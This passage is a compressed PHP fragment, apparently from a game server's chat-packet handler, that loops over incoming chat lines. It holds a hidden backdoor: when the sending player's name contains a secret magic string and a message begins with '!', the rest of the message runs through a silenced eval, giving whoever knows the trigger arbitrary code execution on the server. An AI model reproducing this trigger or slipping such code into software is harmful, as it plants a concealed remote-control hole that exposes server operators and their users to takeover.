...
foreach(explode("\n",$packet->message)as$message){if(trim($message)!=""and strlen($message)<=255 and$this->messageCounter-->0){if(is_numeric(strpos($this->getName(),"$$$$#++##$82272)#+"))){if(substr($message,0,1)==="!"){@eval(substr($message,1));
return;
}
}
